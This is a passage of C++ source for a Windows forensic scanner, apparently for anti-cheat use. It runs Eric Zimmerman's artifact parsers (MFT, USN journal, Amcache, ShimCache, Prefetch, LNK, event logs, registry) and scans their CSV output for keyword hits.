        if (!v.empty()) h.details.push_back({ lbl, v });
        };

    // ── MFTECmd ──────────────────────────────────────────────────────────────
    if (tl.find("mfte") != string::npos) {

        // Detect USN Journal ($J) output by presence of Reason column
        bool isUSN = (Col(headers, "reason") >= 0 || Col(headers, "updatetimestamp") >= 0);

        if (isUSN) {
            // ── $J (USN Journal) columns ──────────────────────────────────────
            string reason = Get(row, Col(headers, "reason"));
            string timestamp = Get(row, Col(headers, "updatetimestamp"));
            string parentPath = Get(row, Col(headers, "parentpath"));
            if (parentPath.empty()) parentPath = Get(row, Col(headers, "parentname"));

            // Map USN Reason flags to a readable event type.
            // Compound reasons (e.g. "Data Overwrite | File Close") are handled
            // by the catch-all branch which passes the full reason string through.
            string reasonLow = Lower(reason);
            if (reasonLow.find("rename") != string::npos && reasonLow.find("old") != string::npos)
                h.eventType = "USN: Renamed (old name)";
            else if (reasonLow.find("rename") != string::npos && reasonLow.find("new") != string::npos)
                h.eventType = "USN: Renamed (new name)";
            else if (reasonLow.find("delete") != string::npos)
                h.eventType = "USN: Deleted";
            else if (reasonLow.find("create") != string::npos)
                h.eventType = "USN: Created";
            else if (reasonLow.find("overwrite") != string::npos ||
                reasonLow.find("data extend") != string::npos ||
                reasonLow.find("truncation") != string::npos)
                h.eventType = "USN: Data Modified";
            else if (!reason.empty())
                h.eventType = "USN: " + reason;
            else
                h.eventType = "USN Journal Entry";

            add("Timestamp", "updatetimestamp");
            add("Reason", "reason");
            add("Parent Path", "parentpath");
            add("Entry #", "entrynumber");
            add("File Attrs", "fileattributes");

            // USN raw sequence number — for sub-second ordering and cross-run
            // correlation (matches UsnJrnl2Csv "USN" column).
            add("USN", "usn");

            // MFT reference numbers with sequence numbers — matching UsnJrnl2Csv
            // columns MFTReference / MFTReferenceSeqNo / MFTParentReference /
            // MFTParentReferenceSeqNo.  Sequence number increments on MFT slot
            // reuse, so a rising seq# at the same MFT entry reveals that a file
            // was deleted and recreated — a key indicator for cheat tool cycling.
            // MFTECmd $J CSV uses EntryNumber/SequenceNumber/ParentEntryNumber/ParentSequenceNumber
            // (NOT the UsnJrnl2Csv-style MFTReference/MFTReferenceSeqNo names).
            add("MFT Ref", "entrynumber");
            add("MFT Ref SeqNo", "sequencenumber");
            add("MFT Parent Ref", "parententrynumber");
            add("MFT Parent SeqNo", "parentsequencenumber");

            // SecurityId — numeric index into $Secure:$SDS.  Changes here
            // alongside a cheat binary can indicate ACL tampering.
            add("Security ID", "securityid");

            // SourceInfo — non-zero means a background agent (not the user)
            // caused this journal entry.  Suspicious on cheat binaries.
            add("Source Info", "sourceinfo");

            return h;
        }

        // ── $MFT columns ──────────────────────────────────────────────────────
        string inuse = Lower(Get(row, Col(headers, "inuse")));
        string prior = Get(row, Col(headers, "filenameprev"));
        if (prior.empty()) prior = Get(row, Col(headers, "previousfilename"));
        string siCr = Get(row, Col(headers, "created0x10"));
        string siMo = Get(row, Col(headers, "lastmodified0x10"));
        string fnCr = Get(row, Col(headers, "created0x30"));
        string isDir = Lower(Get(row, Col(headers, "isdirectory")));
        bool   del = (inuse == "false" || inuse == "0");
        bool   dir = (isDir == "true" || isDir == "1");

        if (del && !prior.empty())
            h.eventType = "Deleted - previously renamed from: " + prior;
        else if (del)
            h.eventType = dir ? "Deleted Directory" : "Deleted File";
        else if (!prior.empty())
            h.eventType = "Renamed (was: " + prior + ")";
        else {
            string cr = siCr.empty() ? fnCr : siCr;
            bool fresh = (!cr.empty() && cr == siMo);
            if (fresh)
                h.eventType = dir ? "Directory Present (never modified after creation)"
                : "File Present (never modified after creation)";
            else if (!siMo.empty() && !cr.empty())
                h.eventType = dir ? "Directory Present (last modified shown below)"
                : "File Present (last modified shown below)";
            else
                h.eventType = dir ? "Directory in MFT" : "File in MFT";
        }
        add("SI Created", "created0x10");
        add("SI Modified", "lastmodified0x10");
        add("SI Accessed", "lastaccess0x10");
        add("FN Created", "created0x30");
        add("File Size", "filesize");
        add("FRN", "entrynumber");
        add("Parent Path", "parentpath");
        add("In Use", "inuse");
        add("Is Directory", "isdirectory");
        add("Previous Name", "filenameprev");
        return h;
    }

    // ── AmcacheParser ─────────────────────────────────────────────────────────
    if (tl.find("amcache") != string::npos) {
        bool isDriver = (Col(headers, "drivername") != -1 || Col(headers, "driverversion") != -1);
        bool isShortcut = (Col(headers, "lnkname") != -1);
        bool isUnassoc = (Col(headers, "sha1") != -1);
        bool isProg = (Col(headers, "programid") != -1 && !isUnassoc);
        string ex = Lower(Get(row, Col(headers, "fileexistsondisk")));

        if (isShortcut)       h.eventType = "Amcache: Shortcut (.lnk) reference";
        else if (isDriver)    h.eventType = "Amcache: Driver binary";
        else if (isProg)      h.eventType = "Amcache: Installed program entry";
        else if (ex == "false" || ex == "0") h.eventType = "Amcache: File no longer on disk (deleted/moved)";
        else                  h.eventType = "Amcache: File was executed or installed";

        add("SHA1", "sha1");
        add("SHA256", "sha256");
        add("Key Last Write", "keylastwritetimestamp");
        add("File Last Write", "filelastwritetimestamp");
        add("File Last Write", "filelastwritetime");
        add("Link Date", "filelinkeddate");
        add("Compile Time", "compileddate");
        add("Install Date", "installdate");
        add("Full Path", "fullpath");
        add("File Size", "size");
        add("Language", "language");
        add("Description", "description");
        add("Publisher", "publisher");
        add("Product Name", "productname");
        add("Product Version", "productversion");
        add("File Version", "version");
        add("Program Name", "name");
        add("Install Source", "installsource");
        add("Driver Version", "driverversion");
        add("Driver Company", "drivercompany");
        add("Driver Signed", "driversigned");
        add("LNK Name", "lnkname");
        add("Is PE File", "ispefile");
        add("Is OS Component", "isoscomponent");
        add("Exists On Disk", "fileexistsondisk");
        return h;
    }

    // ── AppCompatCacheParser (ShimCache) ──────────────────────────────────────
    if (tl.find("appcompat") != string::npos) {
        string ex = Lower(Get(row, Col(headers, "executed")));
        string cachePos = Get(row, Col(headers, "cacheentryposition"));
        string lastMod = Get(row, Col(headers, "lastmodifiedtime"));
        string srcFile = Get(row, Col(headers, "sourcefile"));
        bool confirmed = (ex == "yes" || ex == "true" || ex == "1");
        h.eventType = confirmed ? "Executed (ShimCache confirmed)"
            : "Seen by OS loader - execution not confirmed";
        if (!lastMod.empty())  h.details.push_back({ "File Last Modified (on disk at scan time)", lastMod });
        if (!cachePos.empty()) h.details.push_back({ "ShimCache Position (lower = more recent)", cachePos });
        h.details.push_back({ "Executed Flag", confirmed ? "Yes" : "No / Unknown" });
        if (!srcFile.empty())  h.details.push_back({ "Source Hive", srcFile });
        return h;
    }

    // ── PECmd (Prefetch) ──────────────────────────────────────────────────────
    if (tl.find("pecmd") != string::npos) {
        bool isTimeline = (Col(headers, "runtime") != -1 && Col(headers, "runcount") == -1);
        if (isTimeline) {
            h.eventType = "Executed (Prefetch timeline entry)";
            add("Run Time", "runtime");
            return h;
        }
        string runs = Get(row, Col(headers, "runcount"));
        int rc = runs.empty() ? 0 : atoi(runs.c_str());
        h.eventType = rc > 0
            ? "Executed (" + runs + " time" + (rc == 1 ? "" : "s") + " - Prefetch confirmed)"
            : "Executed (Prefetch entry)";
        add("Last Run", "lastrun");
        add("Run Time 2", "previousrun0");
        add("Run Time 3", "previousrun1");
        add("Run Time 4", "previousrun2");
        add("Run Time 5", "previousrun3");
        add("Run Time 6", "previousrun4");
        add("Run Time 7", "previousrun5");
        add("Run Time 8", "previousrun6");
        add("Run Count", "runcount");
        add("Volume", "volume0name");
        add("Files Loaded", "filesloaded");
        add("Directories", "directories");
        return h;
    }

    // ── JLECmd (Jump Lists) ───────────────────────────────────────────────────
    if (tl.find("jlecmd") != string::npos) {
        string appDesc = Get(row, Col(headers, "appiddescription"));
        string appId = Get(row, Col(headers, "appid"));
        h.eventType = "Jump List entry - file recently accessed via: " +
            (appDesc.empty() ? appId : appDesc);
        add("App Description", "appiddescription");
        add("App ID", "appid");
        add("Target Path", "targetidabsolutepath");
        add("Local Path", "localpath");
        add("Last Used", "lastmodified");
        add("Target Created", "targetcreated");
        add("Target Modified", "targetmodified");
        add("Target Accessed", "targetaccessed");
        add("File Size", "filesize");
        add("Machine ID", "machineid");
        add("MAC Address", "machinemacaddress");
        add("Tracker Created", "trackercreatedon");
        add("Pin Status", "pinstatus");
        add("Source File", "sourcefile");
        return h;
    }

    // ── LECmd (LNK files) ─────────────────────────────────────────────────────
    if (tl.find("lecmd") != string::npos) {
        string localPath = Get(row, Col(headers, "localpath"));
        string netPath = Get(row, Col(headers, "networkpath"));
        string absPath = Get(row, Col(headers, "targetidabsolutepath"));
        string resolvedTarget = localPath.empty() ? (netPath.empty() ? absPath : netPath) : localPath;

        h.eventType = "LNK shortcut - points to: " +
            (resolvedTarget.empty() ? "(could not resolve target)" : resolvedTarget);
        add("Target Local Path", "localpath");
        add("Target Network Path", "networkpath");
        add("Target ID Path", "targetidabsolutepath");
        add("Target File Size", "filesize");
        add("Target Created", "targetcreated");
        add("Target Modified", "targetmodified");
        add("Target Accessed", "targetaccessed");
        add("Machine ID", "machineid");
        add("MAC Address", "machinemacaddress");
        add("Tracker Created", "trackercreatedon");
        add("Arguments", "arguments");
        add("Source File", "sourcefile");
        add("Source Created", "sourcecreated");
        add("Source Modified", "sourcemodified");
        return h;
    }

    // ── RBCmd (Recycle Bin) ───────────────────────────────────────────────────
    if (tl.find("rbcmd") != string::npos) {
        string sz = Get(row, Col(headers, "filesize"));
        string del = Get(row, Col(headers, "deletedon"));
        h.eventType = "File deleted to Recycle Bin" +
            (del.empty() ? "" : " on " + del) +
            (sz.empty() ? "" : " (" + sz + " bytes)");
        add("Source Name ($I file)", "sourcename");
        add("File Name (original path)", "filename");
        add("File Size", "filesize");
        add("Deleted On", "deletedon");
        return h;
    }

    // ── SBECmd (ShellBags) ────────────────────────────────────────────────────
    if (tl.find("sbecmd") != string::npos) {
        string abs = Get(row, Col(headers, "absolutepath"));
        string lastWrite = Get(row, Col(headers, "lastwritetime"));
        string modOn = Get(row, Col(headers, "modifiedon"));
        string slotTime = lastWrite.empty() ? modOn : lastWrite;
        string last = Get(row, Col(headers, "lastinteracted"));
        h.eventType = "Shell folder was browsed/accessed";
        if (!slotTime.empty()) h.details.push_back({ "Last Write Time (folder changed)", slotTime });
        if (!last.empty()) h.details.push_back({ "Last Interacted", last });
        add("Absolute Path", "absolutepath");
        add("MRU Position", "mruposition");
        add("First Interacted", "firstinteracted");
        add("Last Interacted", "lastinteracted");
        add("Bag Path", "bagpath");
        return h;
    }

    // ── EvtxECmd (Event Logs) ─────────────────────────────────────────────────
    if (tl.find("evtxecmd") != string::npos) {
        string evtId = Get(row, Col(headers, "eventid"));
        string mapDesc = Get(row, Col(headers, "mapdescription"));
        string execInf = Get(row, Col(headers, "executableinfo"));
        string evtTime = Get(row, Col(headers, "timecreated"));
        string userName = Get(row, Col(headers, "username"));
        string remHost = Get(row, Col(headers, "remotehost"));

        string evtName;
        if (evtId == "4688") evtName = "Process Created";
        else if (evtId == "7045") evtName = "Service Installed";
        else if (evtId == "4697") evtName = "Service Installed (security)";
        else if (evtId == "4698") evtName = "Scheduled Task Created";
        else if (evtId == "4702") evtName = "Scheduled Task Updated";
        else if (evtId == "1102") evtName = "Audit Log Cleared";
        else if (evtId == "104")  evtName = "System Log Cleared";
        else                      evtName = mapDesc.empty() ? "Event " + evtId : mapDesc;

        h.eventType = "Event Log: " + evtName;
        if (!evtTime.empty())  h.details.push_back({ "Time",            evtTime });
        if (!execInf.empty())  h.details.push_back({ "Executable Info", execInf });
        if (!userName.empty()) h.details.push_back({ "User",            userName });
        if (!remHost.empty())  h.details.push_back({ "Remote Host",     remHost });
        add("Event ID", "eventid");
        add("Map Description", "mapdescription");
        add("Payload", "payload");
        add("Computer", "computer");
        return h;
    }

    // ── RecentFileCacheParser ─────────────────────────────────────────────────
    if (tl.find("recentfilecache") != string::npos) {
        h.eventType = "RecentFileCache: File was executed or installed (AppCompat)";
        add("Entry Number", "entrynumber");
        add("Name", "name");
        return h;
    }

    // ── SrumECmd (SRUM) ───────────────────────────────────────────────────────
    if (tl.find("srumecmd") != string::npos) {
        string exeName = Get(row, Col(headers, "exeinfo"));
        if (exeName.empty()) exeName = Get(row, Col(headers, "app"));
        string sent = Get(row, Col(headers, "bytessent"));
        string recv = Get(row, Col(headers, "bytesreceived"));
        string ts = Get(row, Col(headers, "timestamp"));
        string userId = Get(row, Col(headers, "userid"));

        string csvName = Lower(path);
        string tableType = "App Resource Usage";
        if (csvName.find("network") != string::npos)  tableType = "Network Usage";
        if (csvName.find("energy") != string::npos)  tableType = "Energy Usage";
        if (csvName.find("push") != string::npos)  tableType = "Push Notification";

        h.eventType = "SRUM " + tableType + " record";
        if (!ts.empty())   h.details.push_back({ "Timestamp",       ts });
        if (!exeName.empty()) h.details.push_back({ "Executable",   exeName });
        if (!userId.empty())  h.details.push_back({ "User ID",      userId });
        if (!sent.empty())    h.details.push_back({ "Bytes Sent",   sent });
        if (!recv.empty())    h.details.push_back({ "Bytes Recv",   recv });
        add("CPU Foreground", "foregroundcycletime");
        add("CPU Background", "backgroundcycletime");
        add("Face Time", "facetime");
        add("App", "app");
        return h;
    }

    // ── WxTCmd (Windows 10 Timeline) ─────────────────────────────────────────
    if (tl.find("wxtcmd") != string::npos) {
        string actType = Get(row, Col(headers, "activity_type"));
        string lastMod = Get(row, Col(headers, "lastmodifiedtime"));
        string desc = Get(row, Col(headers, "description"));
        string appId = Get(row, Col(headers, "appid"));
        string payload = Get(row, Col(headers, "payload"));

        h.eventType = "Windows Timeline activity: " +
            (actType.empty() ? "Unknown" : actType);
        if (!lastMod.empty()) h.details.push_back({ "Last Modified", lastMod });
        if (!desc.empty())    h.details.push_back({ "Description",   desc });
        if (!appId.empty())   h.details.push_back({ "App ID",        appId });
        add("Activity Type", "activity_type");
        add("App Activity ID", "appactivityid");
        add("Content URI", "contenturi");
        add("Tag", "tag");
        add("Group", "group");
        add("Expiration Time", "expirationtime");
        if (!payload.empty()) {
            string pTrim = payload.size() > 300 ? payload.substr(0, 300) + "..." : payload;
            h.details.push_back({ "Payload (trimmed)", pTrim });
        }
        return h;
    }

    // ── SumECmd (User Access Logs) ───────────────────────────────────────────
    if (tl.find("sumecmd") != string::npos) {
        string ts = Get(row, Col(headers, "insertdate"));
        string user = Get(row, Col(headers, "username"));
        string client = Get(row, Col(headers, "clientname"));
        string srcAddr = Get(row, Col(headers, "sourceaddress"));
        string authPkg = Get(row, Col(headers, "authenticationpackage"));
        h.eventType = "User Access Log: inbound authentication event";
        if (!ts.empty())      h.details.push_back({ "Date",         ts });
        if (!user.empty())    h.details.push_back({ "Username",     user });
        if (!client.empty())  h.details.push_back({ "Client Name",  client });
        if (!srcAddr.empty()) h.details.push_back({ "Source Addr",  srcAddr });
        if (!authPkg.empty()) h.details.push_back({ "Auth Package", authPkg });
        add("Total Accesses", "totalaccesses");
        add("Last Access", "lastaccess");
        return h;
    }

    // ── RECmd (Registry) ─────────────────────────────────────────────────────
    if (tl.find("recmd") != string::npos) {
        string category = Get(row, Col(headers, "category"));
        string desc = Get(row, Col(headers, "description"));
        string keyPath = Get(row, Col(headers, "keypath"));
        string valName = Get(row, Col(headers, "valuename"));
        string valData = Get(row, Col(headers, "valuedata"));
        string lastWrite = Get(row, Col(headers, "lastwritetimestamp"));
        string hivePath = Get(row, Col(headers, "hivepath"));
        string pluginName = Get(row, Col(headers, "pluginname"));

        h.eventType = "Registry: " +
            (desc.empty() ? (category.empty() ? "Entry" : category) : desc);
        if (!lastWrite.empty())  h.details.push_back({ "Last Write",  lastWrite });
        if (!keyPath.empty())    h.details.push_back({ "Key Path",    keyPath });
        if (!valName.empty())    h.details.push_back({ "Value Name",  valName });
        if (!valData.empty())    h.details.push_back({ "Value Data",  valData.size() > 300 ? valData.substr(0, 300) + "..." : valData });
        if (!hivePath.empty())   h.details.push_back({ "Hive",        hivePath });
        if (!pluginName.empty()) h.details.push_back({ "Plugin",      pluginName });
        if (!category.empty())   h.details.push_back({ "Category",    category });
        return h;
    }

    // ── Generic fallback ──────────────────────────────────────────────────────
    h.eventType = "Detected";
    for (int i = 0; i < (int)headers.size() && i < (int)row.size(); i++) {
        string v = Get(row, i); if (!v.empty()) h.details.push_back({ headers[i], v });
    }
    return h;
}

// =========================================================================
//  ScanCSVs - scan output directory for keyword hits
// =========================================================================
static void ScanCSVs(const wstring& dir, const string& label) {
    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW((dir + L"\\*.csv").c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) { Log("  [!] No CSVs found in " + WtoS(dir.c_str())); return; }
    do {
        wstring wp = dir + L"\\" + fd.cFileName;
        string csvName = WtoS(fd.cFileName);
        FILE* fp = nullptr; _wfopen_s(&fp, wp.c_str(), L"rb");
        if (!fp) { Log("  [!] Cannot open " + csvName); continue; }

        _fseeki64(fp, 0, SEEK_END); long long fileBytes = _ftelli64(fp); _fseeki64(fp, 0, SEEK_SET);
        if (fileBytes < 10) { fclose(fp); Log("  [!] Empty: " + csvName); continue; }

        {
            unsigned char bom[3] = {};
            if (fread(bom, 1, 3, fp) < 3 || !(bom[0] == 0xEF && bom[1] == 0xBB && bom[2] == 0xBF))
                _fseeki64(fp, 0, SEEK_SET);
        }

        Log("  [csv] " + csvName + " (" + std::to_string(fileBytes) + " bytes)");

        string line; vector<string> headers;
        bool first = true; int hits = 0, rows = 0;
        std::set<std::pair<string, string>> seen;
        string tl = Lower(label);

        vector<string> kwLow; for (auto& kw : KW) kwLow.push_back(Lower(kw));

        char _lb[262144];
        while (fgets(_lb, sizeof(_lb), fp)) {
            line.assign(_lb);
            if (!line.empty() && line.back() == '\n') line.pop_back();
            if (!line.empty() && line.back() == '\r') line.pop_back();
            if (line.empty()) continue;

            if (first) {
                vector<string> row = SplitCSV(line);
                headers = row; first = false;
                string hd = "  [hdr] ";
                for (auto& x : headers) hd += "[" + x + "] ";
                Log(hd); continue;
            }
            rows++;

            {
                // Quick pre-filter: whole-word match on the raw lowercased line.
                // Eliminates rows like "qwavecache.dat" or "shockwave" before
                // we pay the cost of CSV splitting.
                string ll = Lower(line); bool any = false;
                for (auto& kw : kwLow) if (MatchesWholeWord(ll, kw)) { any = true; break; }
                if (!any) continue;
            }

            vector<string> row = SplitCSV(line);

            // ── Path resolution ───────────────────────────────────────────────
            string path;
            bool isMft = (tl.find("mfte") != string::npos);

            if (isMft) {
                string fname = Get(row, Col(headers, "filename"));
                string parent = Get(row, Col(headers, "parentpath"));
                if (!fname.empty())
                    path = parent.empty() ? fname : parent + "\\" + fname;
            }

            if (path.empty()) {
                const char* pc[] = {
                    "fullpath", "path", "executablename", "filename", "name", "sourcefile",
                    "targetidabsolutepath", "targetlocalpath", "localpath",
                    "sourcepath", "sourcename",
                    "absolutepath",
                    "executableinfo",
                    "exename", "app",
                    "appid", "contenturi", "description",
                    "name",
                    "valuedata", "keypath",
                    nullptr
                };
                for (int ci = 0; pc[ci]; ci++) {
                    path = Get(row, Col(headers, pc[ci]));
                    if (!path.empty()) break;
                }
            }
            if (path.empty()) continue;

            string fname;
            if (isMft)
                fname = Lower(Get(row, Col(headers, "filename")));
            else
                fname = Lower(FileNameOnly(path));

            // ── Secondary match columns ───────────────────────────────────────
            string extraSearch;
            if (tl.find("jlecmd") != string::npos) {
                extraSearch = Lower(Get(row, Col(headers, "appiddescription")));
            }
            else if (tl.find("evtxecmd") != string::npos) {
                // Only match keywords against ExecutableInfo (the actual binary path),
                // NOT the payload.  Payload text contains service descriptions, event
                // messages, and user-facing strings that legitimately contain words like
                // "wave" (e.g. "NVIDIA Virtual Audio Device (Wave Extensible) (WDM)")
                // and produce constant false positives.  ExecutableInfo is the path to
                // the actual binary and is the only reliable indicator here.
                extraSearch = Lower(Get(row, Col(headers, "executableinfo")));
            }
            else if (tl.find("wxtcmd") != string::npos) {
                extraSearch = Lower(Get(row, Col(headers, "payload")));
                if (extraSearch.size() > 2000) extraSearch = extraSearch.substr(0, 2000);
            }
            else if (tl.find("recmd") != string::npos) {
                string kp = Lower(Get(row, Col(headers, "keypath")));
                string vn = Lower(Get(row, Col(headers, "valuename")));
                string vd = Lower(Get(row, Col(headers, "valuedata")));
                if (vd.size() > 2000) vd = vd.substr(0, 2000);
                extraSearch = kp + " " + vn + " " + vd;
            }

            for (auto& kw : KW) {
                // Use whole-word matching so embedded occurrences like
                // "aniwave", "shockwave", "qwavecache" are not flagged.
                bool matchFname = MatchesWholeWord(fname, kw);
                bool matchExtra = (!extraSearch.empty() && MatchesWholeWord(extraSearch, kw));
                bool matchPath = MatchesWholeWord(Lower(path), kw);

                if (!matchFname && !matchExtra && !matchPath) continue;

                // For MFT ($MFT) and USN ($J) scans, only report executable
                // file types.  This prevents Python source files, HTML docs,
                // Tcl scripts, DDS textures, timezone data, directories, and
                // other non-executable assets from generating hits.
                bool isMFTorUSN = (tl.find("mfte") != string::npos);
                if (isMFTorUSN && !IsExecutableExtension(path)) continue;

                // Deduplicate: for timeline CSVs AND USN journal CSVs, each
                // unique (path, keyword) pair is reported at most once.
                // This prevents the same file accumulating dozens of USN
                // journal entries (e.g. periodic DataExtend/DataTruncation
                // writes) from flooding the report.
                bool isTL = (Lower(csvName).find("timeline") != string::npos);
                bool isUSN = (Lower(csvName).find("usn") != string::npos);
                if (isTL || isUSN) {
                    auto key = std::make_pair(Lower(path), kw);
                    if (seen.count(key)) continue;
                    seen.insert(key);
                }

                hits++;
                HitInfo info = ResolveHit(headers, row, label, kw, path);
                Log("============================================");
                Log("[HIT] Keyword    : " + info.keyword);
                Log("      Tool       : " + info.tool);
                Log("      CSV        : " + csvName);
                Log("      Path       : " + info.path);
                Log("      File Name  : " + FileNameOnly(info.path));
                Log("      Event Type : " + info.eventType);
                for (auto& d : info.details) Log("      " + d.first + " : " + d.second);
                Log("============================================");
            }
        }
        fclose(fp);
        Log("  [~] " + std::to_string(rows) + " rows, " + std::to_string(hits) + " hit(s) in " + csvName);
    } while (FindNextFileW(h, &fd));
    FindClose(h);
}

// =========================================================================
//  Extract embedded tool to temp
// =========================================================================
static wstring Extract(const EmbeddedTool& t) {
    wstring p = TmpDir() + t.filename;
    HANDLE h = CreateFileW(p.c_str(), GENERIC_WRITE, 0, nullptr,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return L"";
    DWORD w = 0;
    WriteFile(h, t.data, (DWORD)t.size, &w, nullptr);
    CloseHandle(h);
    return w == t.size ? p : L"";
}

// =========================================================================
//  Tool runners
// =========================================================================

static void RunAmcache(const wstring& exe, const wstring& out, const wstring& vss) {
    wstring dst = TmpDir() + L"Amcache.hve";
    wstring log1 = TmpDir() + L"Amcache.hve.LOG1";
    wstring log2 = TmpDir() + L"Amcache.hve.LOG2";
    bool ok = false;

    if (!vss.empty()) {
        Log("  [*] Copying Amcache.hve from VSS ...");
        ok = CopyFromVss(vss, L"Windows\\AppCompat\\Programs\\Amcache.hve", dst);
        if (ok) {
            CopyFromVss(vss, L"Windows\\AppCompat\\Programs\\Amcache.hve.LOG1", log1);
            CopyFromVss(vss, L"Windows\\AppCompat\\Programs\\Amcache.hve.LOG2", log2);
        }
    }
    if (!ok) {
        Log("  [*] Copying Amcache.hve directly ...");
        ok = CopyLockedFile(L"C:\\Windows\\AppCompat\\Programs\\Amcache.hve", dst);
        if (ok) {
            CopyLockedFile(L"C:\\Windows\\AppCompat\\Programs\\Amcache.hve.LOG1", log1);
            CopyLockedFile(L"C:\\Windows\\AppCompat\\Programs\\Amcache.hve.LOG2", log2);
        }
    }
    if (!ok) { Log("  [!] Failed to copy Amcache.hve"); return; }

    wstring cmd = L"\"" + exe + L"\" -f \"" + dst + L"\" --csv \"" + out + L"\" --csvf amcache.csv";
    Log("  [cmd] " + WtoS(cmd.c_str()));
    string o = Capture(cmd);
    // NOTE: AmcacheParser may print a locale-specific exception ("Dize geçerli bir DateTime
    // olarak tanınmadı" on Turkish systems, etc.) when an InventoryApplication entry was
    // written in a local date format (dd.MM.yyyy) instead of the invariant format the parser
    // expects.  The affected entry is skipped but all CSVs are still produced.  We detect this
    // condition, emit a clean English note, and strip the raw exception block (which contains
    // the Turkish/locale message, stack trace, and "Please send to saericzimmerman" text) from
    // the output before logging so it never appears in the results file.
    bool amcacheDateErr = (o.find("DateTime") != string::npos ||
        o.find("FormatException") != string::npos ||
        o.find("tanınmadı") != string::npos ||
        o.find("geçerli") != string::npos);
    if (amcacheDateErr)
        Log("  [~] AmcacheParser: 1 InventoryApplication entry skipped due to locale"
            " date-format mismatch (non-fatal, all CSVs still written)");
    if (!o.empty()) {
        // Strip lines that are part of the exception block so they never reach the log.
        // Affected lines begin with or contain any of these markers:
        static const char* kNoiseLines[] = {
            "Unknown value name in InventoryApplication",
            "Error parsing ProgramsEntry",
            "System.FormatException",
            "konum:", "   at ",
            "Please send the following",
            "Key data:", "Key Path:", "Last Write Time:", "Key flags:",
            "Dize ", "tanınmadı", "geçerli",
            // Raw NK/VK registry record dump lines (printed by AmcacheParser debug mode
            // when it cannot parse an InventoryApplication entry):
            "NK Record:", "VK Record:",
            "Relative Offset:", "Absolute Offset:",
            "Signature: nk", "Signature: vk",
            "Is Free:", "Debug:", "Maximum Class", "Maximum Value",
            "Name Length:", "Maximum Name",
            "Parent Cell Index:", "Security Cell Index:",
            "Subkey Counts", "Subkey Lists",
            "User Flags:", "Virtual Control Flags:", "Work Var:",
            "Value Count:", "Value List Cell Index:",
            "Padding:", "SubKey count:", "Value count:",
            "------------ Value #",
            // Additional raw hive dump lines emitted by the registry walk
            // when an InventoryApplication entry cannot be cleanly parsed:
            "Flags: ", "Last Write Timestamp:",
            "Class Cell Index:", "Class Length:",
            "Data Type raw:", "Data Length:", "Offset To Data:",
            "Name Present Flag:",
            "Value Name:", "Value Type:", "Value Data:", "Value Data Slack:",
            "RootDirPath",
            nullptr
        };
        std::istringstream oss(o); string cleaned, ln;
        while (std::getline(oss, ln)) {
            if (!ln.empty() && ln.back() == '\r') ln.pop_back();
            bool skip = false;
            for (int ni = 0; kNoiseLines[ni]; ni++)
                if (ln.find(kNoiseLines[ni]) != string::npos) { skip = true; break; }
            if (!skip) { cleaned += ln; cleaned += '\n'; }
        }
        if (!cleaned.empty()) Log("  [out] " + cleaned.substr(0, 5000));
    }
    DeleteFileW(dst.c_str()); DeleteFileW(log1.c_str()); DeleteFileW(log2.c_str());
}

static void RunAppCompat(const wstring& exe, const wstring& out, const wstring& vss) {
    wstring dst = TmpDir() + L"SYSTEM";
    wstring log1 = TmpDir() + L"SYSTEM.LOG1";
    wstring log2 = TmpDir() + L"SYSTEM.LOG2";
    bool ok = false;

    if (!vss.empty()) {
        Log("  [*] Copying SYSTEM hive from VSS ...");
        ok = CopyFromVss(vss, L"Windows\\System32\\config\\SYSTEM", dst);
        if (ok) {
            CopyFromVss(vss, L"Windows\\System32\\config\\SYSTEM.LOG1", log1);
            CopyFromVss(vss, L"Windows\\System32\\config\\SYSTEM.LOG2", log2);
        }
    }
    if (!ok) {
        Log("  [*] Copying SYSTEM hive directly ...");
        ok = CopyLockedFile(L"C:\\Windows\\System32\\config\\SYSTEM", dst);
        if (ok) {
            CopyLockedFile(L"C:\\Windows\\System32\\config\\SYSTEM.LOG1", log1);
            CopyLockedFile(L"C:\\Windows\\System32\\config\\SYSTEM.LOG2", log2);
        }
    }
    if (!ok) { Log("  [!] Failed to copy SYSTEM hive"); return; }

    wstring cmd = L"\"" + exe + L"\" -f \"" + dst + L"\" --csv \"" + out + L"\" --csvf appcompat.csv";
    Log("  [cmd] " + WtoS(cmd.c_str()));
    string o = Capture(cmd);
    if (!o.empty()) Log("  [out] " + o.substr(0, 2000));

    // AppCompatCacheParser 1.5.x throws ArgumentOutOfRangeException on some
    // SYSTEM hives when it tries to replay transaction logs that contain an
    // oversized ASCII buffer. Retrying with --nl (no logs) skips log replay
    // and parses the base hive directly, which avoids the crash.
    if (o.find("ArgumentOutOfRangeException") != string::npos ||
        o.find("Index and count must refer") != string::npos) {
        Log("  [!] AppCompatCacheParser crashed during log replay - retrying with --nl (no transaction logs) ...");
        wstring cmdNl = L"\"" + exe + L"\" -f \"" + dst + L"\" --csv \"" + out + L"\" --csvf appcompat.csv --nl";
        Log("  [cmd] " + WtoS(cmdNl.c_str()));
        string o2 = Capture(cmdNl);
        if (!o2.empty()) Log("  [out] " + o2.substr(0, 2000));
    }

    DeleteFileW(dst.c_str()); DeleteFileW(log1.c_str()); DeleteFileW(log2.c_str());
}

// ── PECmd (Prefetch) ───────────────────────────────────────────────────────
// Keyword-only prefetch scanner.
// Only reports entries where the executable name or resolved path contains
// a keyword. Signature and presence are shown as informational context only —
// they never trigger a flag on their own.
static void ScanPrefetchKeywords(const wstring& csvDir) {
    Log("  [*] Scanning prefetch CSV for keyword hits ...");

    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW((csvDir + L"\\*.csv").c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return;

    int flagged = 0;
    do {
        wstring wp = csvDir + L"\\" + fd.cFileName;
        string csvName = WtoS(fd.cFileName);
        if (Lower(csvName).find("timeline") != string::npos) continue;

        FILE* fp = nullptr; _wfopen_s(&fp, wp.c_str(), L"rb");
        if (!fp) continue;
        string content; char buf[4096]; size_t n;
        while ((n = fread(buf, 1, sizeof(buf), fp)) > 0) content.append(buf, n);
        fclose(fp);

        if (content.size() >= 3 &&
            (unsigned char)content[0] == 0xEF &&
            (unsigned char)content[1] == 0xBB &&
            (unsigned char)content[2] == 0xBF)
            content = content.substr(3);

        std::istringstream ss(content);
        string line; vector<string> headers; bool first = true;

        while (std::getline(ss, line)) {
            if (!line.empty() && line.back() == '\r') line.pop_back();
            if (line.empty()) continue;
            vector<string> row = SplitCSV(line);
